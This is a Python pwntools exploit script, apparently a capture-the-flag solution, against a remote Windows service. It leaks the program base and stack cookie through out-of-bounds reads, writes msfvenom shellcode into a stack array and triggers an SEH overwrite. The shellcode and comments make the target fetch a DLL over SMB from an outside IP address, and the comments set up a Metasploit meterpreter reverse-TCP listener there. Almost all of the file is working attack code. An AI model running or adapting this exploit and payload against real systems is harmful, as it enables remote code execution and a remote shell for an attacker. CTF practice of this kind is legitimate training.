#!/usr/bin/env python2

from __future__ import print_function

import sys

from pwn import *

LOCAL = False

if LOCAL:
    HOST = '192.168.33.1'
    PORT = 8080
else:
    HOST = 'docker.acictf.com'
    PORT = int(sys.argv[1])

# Shellcode:
# msfvenom -p windows/exec CMD="rundll32.exe \\\\159.65.160.185\\zcRIx\\test.dll,0" -f python
# 
# Setup the metasploit listener on a vps with:
# use windows/smb/smb_delivery
# set srvhost 159.65.160.185
# set payload windows/meterpreter_reverse_tcp
# set lhost 159.65.160.185
# set lport 21
# exploit
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += b"\xff\xd5\x72\x75\x6e\x64\x6c\x6c\x33\x32\x2e\x65\x78"
buf += b"\x65\x20\x5c\x5c\x31\x35\x39\x2e\x36\x35\x2e\x31\x36"
buf += b"\x30\x2e\x31\x38\x35\x5c\x7a\x63\x52\x49\x78\x5c\x74"
buf += b"\x65\x73\x74\x2e\x64\x6c\x6c\x2c\x30\x00"

PAYLOAD = ''
PAYLOAD += '\x90'* 8 * 2
PAYLOAD += buf
mod_8 = len(PAYLOAD) % 8
PAYLOAD += '\x00' * (8 - mod_8)
log.info('Payload len: %i' % len(PAYLOAD))


def read_dword(io, index):
    io.sendlineafter('Write\n', '1')
    io.sendlineafter('Index: ', str(index))
    value = io.recvline().strip()
    return int(value, 16)


def write_dword(io, index, value):
    hex_value = hex(value)[2:].rstrip('L')
    io.sendlineafter('Write\n', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('hex: ', hex_value)


def seh_overwrite(io, stack_cookie, overwrite_addr):
    io.sendlineafter('Write\n', '2')
    io.sendlineafter('Index: ', str(0xff - 1))

    payload = ''
    payload += 'A'*16
    payload += p32(stack_cookie)
    payload += 'B'*4
    payload += p32(overwrite_addr)

    io.sendlineafter('hex: ', payload)
    io.sendlineafter('Write\n', '3')
    io.sendlineafter('Index: ', '1')


def main():
    io = remote(HOST, PORT)

    # context.log_level = 'debug'

    pointer_leak = read_dword(io, 284)
    program_base = pointer_leak - 0x214 - 0x1000
    log.info('Leaked program base address %#x' % program_base)

    stack_cookie = read_dword(io, 285)
    log.info('Leaked stack cookie %#x' % stack_cookie)

    write_dword(io, 0, 0xdeadbeef)
    stack_leak = read_dword(io, -7)
    array_base = stack_leak - 0x400
    log.info('Leaked stack reference %#x' % stack_leak)
    log.info('Leaked controlled stack buffer address of %#x' % array_base)

    # write main payload
    payload_dwords = [
        u32(PAYLOAD[i:i+4]) for i in range(0, len(PAYLOAD), 4)
    ]

    log.info('Writing shellcode to number array...')
    for i, payload_dword in enumerate(payload_dwords):
        write_dword(io, i, payload_dword)

    seh_overwrite(io, stack_cookie, array_base + 8)
    log.info('Sent SEH overwrite...')

    # just to keep the connection open
    io.interactive()


if __name__ == '__main__':
    main()